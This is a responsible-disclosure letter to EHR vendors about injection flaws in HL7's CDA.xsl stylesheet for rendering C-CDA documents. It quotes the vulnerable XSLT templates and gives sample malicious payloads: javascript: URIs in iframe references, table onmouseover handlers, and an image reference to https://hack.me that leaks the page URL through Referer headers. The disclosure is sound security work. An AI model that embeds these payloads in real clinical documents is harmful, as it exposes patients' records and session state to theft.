### Dear EHR Vendor,

I'm a medical informatics researcher at Boston Children's Hospital, and I'm
writing to share some security considerations pertinent to any EHR that
displays Consolidated CDA documents for Meaningful Use (especially in a Web
browser environment). I would appreciate if you could ensure that the message
below reaches someone on your security team.

Best,

Josh Mandel, MD  
Lead Architect, SMART Platforms  
Harvard Medical School / Boston Children's Hospital  

---

### Dear Security Team,

I'm writing to report a *potential security vulnerability* in the display of
Consolidated CDA documents. To be clear, I haven't tested whether your EHR
products are vulnerable to the issues below, but I have found that they
*affect some production EHR systems*, and I wanted to share this report with
Web-based EHR vendors privately before I describe it in public on the [SMART Platforms
blog](http://smartplatforms.org).

In short, the concern has to do with the use of XSLT "stylesheets" to
display externally-supplied C-CDA documents in the EHR. To be specific:
**the CDA.xsl stylesheet provided by HL7 (which I've seen broadly adopted by many EHR vendors) can  leave EHRs vulnerable to attacks by maliciously-composed documents.**

The "TL;DR" version is: If you're using XSLT stylesheets to render C-CDAs in
your EHR, make sure you understand the security implications. Otherwise you
could be vulnerable to a data breach.

**I would appreciate if you could reply to me** so I can track the dissemination of
this notice. My plan is to write a public blog post that would be published on
3/21/2014. If you discover that your system is vulnerable and you need more
time to repair it, please let me know prior to 3/20, and I can delay publication if necessary.

Best,

  Josh Mandel, MD  
  Lead Architect, SMART Platforms  
  Harvard Medical School / Boston Children's Hospital


### Three fundamental attacks

Many vendors appear to be using (slightly modified) versions of the
[CDA.xsl](https://github.com/chb/sample_ccdas/blob/master/CDA.xsl) that comes
with HL7's C-CDA release. This provides potential attackers with a highly
visible, leveragable target.

My analysis revealed at least three ways to craft a malicious C-CDA. I'll describe them in detail...


#### 1. Unsanitized `nonXMLBody/text/reference/@value` can execute JavaScript
One opportunity for injection attacks is the default handling of a `nonXMLBody` CDA. 

```
<xsl:template match='n1:component/n1:nonXMLBody'>
  <xsl:choose>
  <!-- if there is a reference, use that in an IFRAME -->
  <xsl:when test='n1:text/n1:reference'>
  <IFRAME name='nonXMLBody' id='nonXMLBody' WIDTH='80%' HEIGHT='600' src='{n1:text/n1:reference/@value}' />
</xsl:when>
```

This means we can get javascript to execute if we can supply it in a reference like:

```
<nonXMLBody>
  <text>
    <reference value="javascript:alert(window.parent.location);"/>
  </text>
</nonXMLBody>
```

The XSLT-output HTML rendering would include the following dangerous snippet:

```
  <iframe src="javascript:alert(window.parent.location);"></iframe>
```

#### 2. Unsanitized `table/@onmouseover` can execute JavaScript

A valid C-CDA document is not allowed to provide `table/@onmouseover`
attributes. But if invalid documents are allowed into a system, then the
following permissive "copy all" can be dangerous:

```
<!-- Tables -->
<xsl:template
  match="n1:table/@*|n1:thead/@*|n1:tfoot/@*|n1:tbody/@*|n1:colgroup/@*|n1:col/@*|n1:tr/@*|n1:th/@*|n1:td/@*">
  <xsl:copy>
    <xsl:copy-of select="@*" />
    <xsl:apply-templates />
  </xsl:copy>
```

What this says is: "when you find a `table` in the C-CDA document, just copy
all of its XML attributes right into the rendered document. An attacker can use
this to inject JavaScript in the resulting document. For example, an attacker
could steal cookies and application state, and them back to an external server.

A source C-CDA document would supply a table like:

```
<table 
   onmouseover="alert(window.parent.location);"
   style="height: 100%; width: 100%; position: fixed; left: 0px; top: 0px;">
</table>
```

... and the XSLT-output HTML rendering would contain the source `table` element verbatim.


#### Unsanitized `observationMedia/value/reference/@value` can leak state via HTTP `Referer` headers

Searching CDA.xsl for the term `img`, reveals two places where image tags are
emitted.  Both occur within the `renderMultiMedia` template definition:

```
<xsl:template match="n1:renderMultiMedia">
  <xsl:variable name="imageRef" select="@referencedObject" />
      <!-- snipped for brevity -->
      <xsl:if
        test="//n1:observationMedia[@ID=$imageRef]/n1:value[@mediaType='image/gif' or @mediaType='image/jpeg']">
        <br clear="all" />
        <xsl:element name="img">
          <xsl:attribute name="src"><xsl:value-of
              select="//n1:observationMedia[@ID=$imageRef]/n1:value/n1:reference/@value" /></xsl:attribute>
        </xsl:element>
      </xsl:if>
      <!-- snipped for brevity -->
</xsl:template>
```

By constructing an appropriate `section` in a C-CDA document to act as input to
the template above, an attacker can cause the browser to leak the current page
URL to `https://hack.me`:

```
<text>
  This image loads from an external server...
  <renderMultiMedia referencedObject="MM1"></renderMultiMedia>
</text>
<entry>
  <observationMedia ID="MM1">
    <id root="10.23.4567.345"/>
    <value xsi:type="ED" mediaType="image/jpeg">
      <reference value="https://hack.me/leaked-from-image.png"/>
    </value>
  </observationMedia>
</entry>
```

The XSLT-output HTML rendering would include the potentially dangerous snippet:

```
<img src="https://hack.me/leaked-from-image.png"></img>
```

Each time the document is viewed, the browser sends an HTTP `Referer` header to `hack.me` that inclues the source page URL. This can be dangerous if any private session state is embedded in that URL.
